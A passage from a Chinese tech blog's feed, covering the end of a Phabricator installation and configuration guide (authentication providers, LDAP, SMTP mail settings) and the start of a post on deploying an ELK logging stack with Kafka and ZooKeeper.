&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; /var/www/html/phabricator/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./bin/config &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; phabricator.base-uri &lt;span class=&quot;string&quot;&gt;&#39;http://your_domain_or_IP&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./bin/phd start&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用浏览器访问：&lt;a href=&quot;http://your_domain_or_IP&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://your_domain_or_IP&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;然后根据提示修复一些问题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Phabricator_01.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;登录进来管理界面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Phabricator_02.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;创建项目例子：&quot;&gt;&lt;a href=&quot;#创建项目例子：&quot; class=&quot;headerlink&quot; title=&quot;创建项目例子：&quot;&gt;&lt;/a&gt;创建项目例子：&lt;/h3&gt;&lt;p&gt; Projects ——》 Create Project ——》填写好项目名称 ——》Create New Project &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Phabricator_03.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;创建完成效果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Phabricator_04.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;安装完成以后出现10多个问题解决：&quot;&gt;&lt;a href=&quot;#安装完成以后出现10多个问题解决：&quot; class=&quot;headerlink&quot; title=&quot;安装完成以后出现10多个问题解决：&quot;&gt;&lt;/a&gt;安装完成以后出现10多个问题解决：&lt;/h3&gt;&lt;p&gt;汉化翻译过来：&lt;br&gt; &lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/phabricator_05.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;❓说明：按问题提示操作解决故障。一般都有问题修复解决方法的，官方这点还是很不错的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;棘手问题1 如果遇到这个问题：Alternate File Domain Not Configured&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;操作了这条命令失效 最好别操作：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;phabricator/ $ ./bin/config &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; security.alternate-file-domain &amp;lt;domain&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@Phabricator phabricator]&lt;span class=&quot;comment&quot;&gt;# ./bin/config set security.alternate-file-domain http://cdn.phabricator.com&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果是CDN数据存放可以使用这个命令。不然会出现访问失败。&lt;br&gt;我是参考这篇文档解决问题：&lt;a href=&quot;https://community.bitnami.com/t/phabricator-not-rendering-resources-over-https/39005&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Phabricator not rendering resources over https&lt;/a&gt;删除&lt;code&gt;security.alternate-file-domain&lt;/code&gt;可以访问。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;棘手问题2 PHP Extension ‘APC’ Not Installed  参考文章：&lt;a href=&quot;http://php.net/manual/zh/apc.installation.php&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PHP Extension ‘APC’ Not Installed&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# yum install php-pear&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# pecl install apc&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# echo &quot;extension=apc.so&quot; &amp;gt;&amp;gt; /etc/php.ini&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# echo &quot;apc.enabled=1&quot; &amp;gt;&amp;gt; /etc/php.ini&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# cp /usr/share/pear/apc.php /var/www/html/apc.php (this step is optional)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# /etc/init.d/httpd restart&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;phabricator官网配置说明&lt;a href=&quot;https://secure.phabricator.com/book/phabricator/article/configuration_guide/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Configuration Guide&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1-身份验证提供者&quot;&gt;&lt;a href=&quot;#1-身份验证提供者&quot; class=&quot;headerlink&quot; title=&quot;1. 身份验证提供者&quot;&gt;&lt;/a&gt;1. 身份验证提供者&lt;/h3&gt;&lt;p&gt;Phabricator登录的方法被称为身份验证提供者（Authentication Providers）。例如,当我们设置了一个”用户名/密码”身份验证提供者,那么用户可以通过传统的用户名和密码登录。Phabricator支持多种登录系统。当我们使用Administrators登录到后台之后，我们就可以启用或禁用这些Providers，配置用户如何注册或登录到Phabricator。&lt;/p&gt;
&lt;p&gt;在公司内部使用，我们一般使用&lt;code&gt;Username/Password&lt;/code&gt;或LDAP，对于开源项目，我们也可以使用类似于GitHub等OAuth第三方登录。在使用&lt;code&gt;Username/Password&lt;/code&gt;登录方式时，我们还可以限制注册用户时的邮箱后缀，我们可以设置成公司的邮箱域名。&lt;/p&gt;
&lt;h3 id=&quot;1-1-修改登录方式&quot;&gt;&lt;a href=&quot;#1-1-修改登录方式&quot; class=&quot;headerlink&quot; title=&quot;1.1 修改登录方式&quot;&gt;&lt;/a&gt;1.1 修改登录方式&lt;/h3&gt;&lt;p&gt;网页上可以对其进行相应的修改。具体位置在：&lt;br&gt;左侧菜单&lt;code&gt;Auth -&amp;gt; Add Provider -&amp;gt; username/password&lt;/code&gt;(账号密码方式登录)&lt;br&gt;支持 账号密码登录以及第三方（facebook、github等）账号登录。另外，可以选择用户自主注册，或者禁用（管理员配置）。&lt;/p&gt;
&lt;p&gt;这里选择LDAP同步需要安装PHP LDAP扩展：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Before you can &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; up or use LDAP, you need to install the PHP LDAP extension. It is not currently installed, so PHP can not talk to LDAP. Usually you can install it with `yum install php-ldap`, `apt-get install php5-ldap`, or a similar package manager command.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;yum install php-ldap -y&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注：如果第一次管理员登录以后，没有修改登录方式，接着退出。下次登录可能会被锁住，需要使用以下命令解锁。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;/bin/auth recover &amp;lt;username&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;1-2-设置用户登录认证方式&quot;&gt;&lt;a href=&quot;#1-2-设置用户登录认证方式&quot; class=&quot;headerlink&quot; title=&quot;1.2 设置用户登录认证方式&quot;&gt;&lt;/a&gt;1.2 设置用户登录认证方式&lt;/h3&gt;&lt;p&gt;使用管理员账号登录，在左侧的菜单中选择 Auth ，然后点击右上侧 Add Provider，在列表中选则你需要的认证方式。&lt;/p&gt;
&lt;p&gt;我选择是&lt;code&gt;Username/Password&lt;/code&gt;的方式，即用户自己注册&lt;code&gt;Phabricator&lt;/code&gt;账号。为了保障安全，我设置了只允许公司邮箱地址注册：&lt;code&gt;Config ---&amp;gt; Core Settings ---&amp;gt; Authentication ---&amp;gt; auth.email-domains&lt;/code&gt;。你还可以选择 auth.require-approval ，即新注册用户需要管理员批准。&lt;/p&gt;
&lt;h3 id=&quot;1-3-设置邮件发送服务参数&quot;&gt;&lt;a href=&quot;#1-3-设置邮件发送服务参数&quot; class=&quot;headerlink&quot; title=&quot;1.3 设置邮件发送服务参数&quot;&gt;&lt;/a&gt;1.3 设置邮件发送服务参数&lt;/h3&gt;&lt;p&gt;首先，配置 mail-adapter （邮件发送方式）：&lt;code&gt;Config ---&amp;gt; Core Settings ---&amp;gt; Mail ---&amp;gt; metamta.mail-adapter&lt;/code&gt;，我选择的是 PhabricatorMailImplementationPHPMailerAdapter ，通过SMTP的方式发送邮件。在选择完之后，需要设置SMTP服务器地址、账号和密码：Config —&amp;gt; Core Settings —&amp;gt; PHPMailer —&amp;gt; metamta.mail-adapter，根据你自己邮箱的配置，相应的设置 phpmailer.smtp-host、phpmailer.smtp-port、phpmailer.smtp-protocol、phpmailer.smtp-user、phpmailer.smtp-password、phpmailer.smtp-encoding 。&lt;/p&gt;
&lt;h3 id=&quot;2-邮箱关联&quot;&gt;&lt;a href=&quot;#2-邮箱关联&quot; class=&quot;headerlink&quot; title=&quot;2.邮箱关联&quot;&gt;&lt;/a&gt;2.邮箱关联&lt;/h3&gt;&lt;p&gt;切换到&lt;code&gt;phabricator/bin/&lt;/code&gt;目录下运行&lt;code&gt;daemon：./bin/phd start&lt;/code&gt;。 注意每次重启需要再次启用，因此建议放到启动脚本上。&lt;/p&gt;
&lt;p&gt;配置mail：通过web访问phabricator并在页面上进行配置：（这里使用的是外部SMTP server的方式，更多方式参见phabricator docs）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;用administrator账号登录后，在administration栏选择Config进入
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;1）选择mail，设置&lt;br&gt;    metamta.default-address – xxxx@163.com // 注意：这里必须要用与smtp服务器对应的邮箱地址，不然邮件发不出去&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;metamta.domain -- phabricator.myproject.com // 随意

metamta.mail-adapter: set to &amp;quot;PhabricatorMailImplementationPHPMailerAdapter&amp;quot;

metamta.send-immediately: Send Via Daemons （目前版本貌似没有）
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2）选择PHPMailer，设置：（以163.com的SMTP server为例）&lt;br&gt;    phpmailer.mailer: set to “smtp”. （默认）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;phpmailer.smtp-host: smtp.163.com 

phpmailer.smtp-port: 25 （默认）

phpmailer.smtp-user: xxxx

phpmailer.smtp-password: xxxx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;目前版本页面上不能配置PHPMailer，只能使用工具/bin/config工具set相对应的配置项。&lt;/p&gt;
&lt;figure class=&quot;highlight dsconfig&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;phabricator/&lt;/span&gt; $ ./&lt;span class=&quot;string&quot;&gt;bin/&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;mail &lt;/span&gt;&lt;span class=&quot;built_in&quot;&gt;list-outbound&lt;/span&gt;   &lt;span class=&quot;comment&quot;&gt;# List outbound mail.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;phabricator/&lt;/span&gt; $ ./&lt;span class=&quot;string&quot;&gt;bin/&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;mail &lt;/span&gt;&lt;span class=&quot;string&quot;&gt;show-outbound &lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;# Show details about messages.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;phabricator/&lt;/span&gt; $ ./&lt;span class=&quot;string&quot;&gt;bin/&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;mail &lt;/span&gt;&lt;span class=&quot;string&quot;&gt;send-test &lt;/span&gt;      &lt;span class=&quot;comment&quot;&gt;# Send test messages.&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;3-参考：&quot;&gt;&lt;a href=&quot;#3-参考：&quot; class=&quot;headerlink&quot; title=&quot;3. 参考：&quot;&gt;&lt;/a&gt;3. 参考：&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.oschina.net/question/191440_125562&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.oschina.net/question/191440_125562&lt;/a&gt;  Phabricator入门手册&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/zzllabcd/article/details/49997421&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/zzllabcd/article/details/49997421&lt;/a&gt; 10.04Ubuntu安装&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/clovn/p/5103611.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/clovn/p/5103611.html&lt;/a&gt; debian7安装&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://secure.phabricator.com/book/phabricator/article/installation_guide/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://secure.phabricator.com/book/phabricator/article/installation_guide/&lt;/a&gt; 官方guider&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://liuzhichao.com/p/1992.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://liuzhichao.com/p/1992.html&lt;/a&gt;  Phabricator 实践之配置账号和注册&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.oschina.net/question/191440_125562&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.oschina.net/question/191440_125562&lt;/a&gt; 入门手册&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.jianshu.com/p/b1a75a14638c&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.jianshu.com/p/b1a75a14638c&lt;/a&gt;  简书中的分享（较为完整）&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/ToDoToTry/p/3956687.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/ToDoToTry/p/3956687.html&lt;/a&gt; git server搭建指南&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://my.oschina.net/miger/blog/775609&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://my.oschina.net/miger/blog/775609&lt;/a&gt; linux平台arc工具的使用&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/peapon/article/details/29881575&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/peapon/article/details/29881575&lt;/a&gt; windows中arc的使用&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Phabricator是由Fackbook开发的一个开源的可视化代码审查工具。&quot;&gt;&lt;a href=&quot;#Phabricator是由Fackbook开发的一个开源的可视化代码审查工具。&quot; class=&quot;headerlink&quot; title=&quot;Phabricator是由F
    
    </summary>
    
      <category term="automation" scheme="http://blog.yangcvo.me/categories/automation/"/>
    
    
  </entry>
  
  <entry>
    <title>搭建(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafka为消息中心的ELK日志平台</title>
    <link href="http://blog.yangcvo.me/2016/12/29/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%10%E5%B9%B3%E5%8F%B0/Elasticsearch/%E6%90%AD%E5%BB%BA(ElasticSearch-2.x%20Logstash-2.x%20Kibana-4.5.x%20zookeeper3.4.6)%20Kafka%E4%B8%BA%E6%B6%88%E6%81%AF%E4%B8%AD%E5%BF%83%E7%9A%84ELK%E6%97%A5%E5%BF%97%E5%B9%B3%E5%8F%B0/"/>
    <id>http://blog.yangcvo.me/2016/12/29/日志分析平台/Elasticsearch/搭建(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafka为消息中心的ELK日志平台/</id>
    <published>2016-12-29T09:56:03.000Z</published>
    <updated>2017-04-20T06:43:34.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;搭建-ElasticSearch-2-x-Logstash-2-x-Kibana-4-5-x-zookeeper3-4-6-Kafka为消息中心的ELK日志平台&quot;&gt;&lt;a href=&quot;#搭建-ElasticSearch-2-x-Logstash-2-x-Kibana-4-5-x-zookeeper3-4-6-Kafka为消息中心的ELK日志平台&quot; class=&quot;headerlink&quot; title=&quot;搭建(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafka为消息中心的ELK日志平台&quot;&gt;&lt;/a&gt;搭建(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafka为消息中心的ELK日志平台&lt;/h3&gt;&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;ELK是业界标准的日志采集,存储索引,展示分析系统解决方案&lt;/p&gt;
&lt;p&gt;logstash提供了灵活多样的插件支持不同的input/output&lt;/p&gt;
&lt;p&gt;主流使用redis/kafka作为日志/消息的中间环节&lt;/p&gt;
&lt;p&gt;如果已有kafka的环境了,使用kafka比使用redis更佳&lt;/p&gt;
&lt;p&gt;以下是一个最简化的配置做个笔记,elastic官网提供了非常丰富的文档&lt;/p&gt;
&lt;p&gt;不要用搜索引擎去搜索,没多少结果的,请直接看官网文档&lt;/p&gt;
&lt;h3 id=&quot;版本及连接&quot;&gt;&lt;a href=&quot;#版本及连接&quot; class=&quot;headerlink&quot; title=&quot;版本及连接&quot;&gt;&lt;/a&gt;版本及连接&lt;/h3&gt;&lt;p&gt;elasticseearch版本: 2.4.3&lt;/p&gt;
&lt;h3 id=&quot;系统要求&quot;&gt;&lt;a href=&quot;#系统要求&quot; class=&quot;headerlink&quot; title=&quot;系统要求&quot;&gt;&lt;/a&gt;系统要求&lt;/h3&gt;&lt;p&gt;如果仅作测试用, 不需要两天机器, 可以将两个节点部署在同一台机器上, 对磁盘/cpu要求不高, 内存大于2g基本足够了&lt;/p&gt;
&lt;p&gt;如果是正式环境, 需要根据日志量进行评估, 例如, 每天日志量占硬盘约约10G, 且保留30天日志, 则磁盘会占用约300g, es设定的阈值是磁盘空间占满85%则日志开始告警. 所以, 需要至少 300/0.85=354g.&lt;/p&gt;
&lt;p&gt;准备4台机器, 在同一个局域网内(可ping通), 分别在每台机器上部署相应es节点, 搭建一套日志集群.&lt;/p&gt;
&lt;p&gt;4台机器, 最少的资源了, 但是没法做到高可用, 所以, 还需要再加一台机器, 防止脑裂, 具体见最后(两台主力机器+一台稳定的机器就行)&lt;/p&gt;
&lt;p&gt;集群节点: 最少4台机器&lt;br&gt;内存: 8G及以上&lt;br&gt;cpu: 4核及以上&lt;br&gt;硬盘: 800G及以上, 建议1T, 集群容量约10亿级(取决于对应日志大小)&lt;br&gt;操作系统: centos&lt;/p&gt;
&lt;h3 id=&quot;准备工作-应用-网络-环境&quot;&gt;&lt;a href=&quot;#准备工作-应用-网络-环境&quot; class=&quot;headerlink&quot; title=&quot;准备工作: 应用/网络 环境&quot;&gt;&lt;/a&gt;准备工作: 应用/网络 环境&lt;/h3&gt;&lt;p&gt;SLB： 阿里云做负载均衡&amp;amp; 或者自己搭建nginx&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ELK服务端集群：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;系统centos 6.7  JDK1.8  版本：Elasticsearch-2.4.0&lt;/p&gt;
&lt;p&gt;es_01 10.47.88.206&lt;br&gt;es_02 10.47.88.188&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Kibana服务端集群：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;系统centos 6.7  JDK1.8  版本：kibana-4.5.1&lt;/p&gt;
&lt;p&gt;es_01 10.47.88.206&lt;br&gt;es_02 10.47.88.188&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;KafKa集群&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;系统centos 6.7  JDK1.8  版本：kafka_2.10-0.9&lt;/p&gt;
&lt;p&gt;kafka_01 10.46.72.172&lt;br&gt;kafka_02 10.47.88.103&lt;br&gt;kafka_03 10.47.102.137&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;zookeeper集群&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;系统centos 6.7  JDK1.8  版本：zookeeper-3.4.6&lt;/p&gt;
&lt;p&gt;kafka_01 10.46.72.172&lt;br&gt;kafka_02 10.47.88.103&lt;br&gt;kafka_03 10.47.102.137&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;logstash-2.4&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;客户端：系统centos 6.7  JDK1.8  版本： logstash-2.4&lt;/p&gt;
&lt;p&gt;tomcat-account_01: 10.27.232.85&lt;/p&gt;
&lt;p&gt;都要jdk1.8支持。&lt;/p&gt;
&lt;h3 id=&quot;整体说明&quot;&gt;&lt;a href=&quot;#整体说明&quot; class=&quot;headerlink&quot; title=&quot;整体说明&quot;&gt;&lt;/a&gt;整体说明&lt;/h3&gt;&lt;h4 id=&quot;数据流向-gt-日志-消息整体流向&quot;&gt;&lt;a href=&quot;#数据流向-gt-日志-消息整体流向&quot; class=&quot;headerlink&quot; title=&quot;数据流向=&amp;gt;日志/消息整体流向&quot;&gt;&lt;/a&gt;数据流向=&amp;gt;日志/消息整体流向&lt;/h4&gt;&lt;p&gt;logstash =&amp;gt; kafka =&amp;gt; logstash =&amp;gt; elasticsearch =&amp;gt; kibana&lt;/p&gt;
&lt;h3 id=&quot;部署&quot;&gt;&lt;a href=&quot;#部署&quot; class=&quot;headerlink&quot; title=&quot;部署&quot;&gt;&lt;/a&gt;部署&lt;/h3&gt;&lt;h4 id=&quot;1-确认JDK版本及安装&quot;&gt;&lt;a href=&quot;#1-确认JDK版本及安装&quot; class=&quot;headerlink&quot; title=&quot;1. 确认JDK版本及安装&quot;&gt;&lt;/a&gt;1. 确认JDK版本及安装&lt;/h4&gt;&lt;p&gt;es依赖java的版本最小为1.7&lt;/p&gt;
&lt;p&gt;如果系统中未安装JDK&lt;br&gt;则命令返回&lt;code&gt;bash: java: command not found,&lt;/code&gt; 需要安装&lt;code&gt;JDK&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果系统中安装了JDK, 需确认版本是否大于java 1.7, 否则需要升级&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;java -version&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;java version &lt;span class=&quot;string&quot;&gt;&quot;1.7.0_51&quot;&lt;/span&gt; Java(TM) SE Runtime Environment (build 1.7.0_51-b13) Java HotSpot(TM) Server VM (build 24.51-b03, mixed mode)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;安装及升级java(注意根据系统不同运行对应安装命令)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Redhat/Centos/Fedora&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sudo yum install java-1.7.0-openjdk&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;或者到官网, 下载最新的jdk的rpm包, 然后安装&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;wget http://download.oracle.com/otn-pub/java/jdk/8u91-b14/jdk-8u91-linux-x64.rpm&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;rpm -Uvh jdk-8u91-linux-x64.rpm&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再次确认安装成功&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;java -version&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
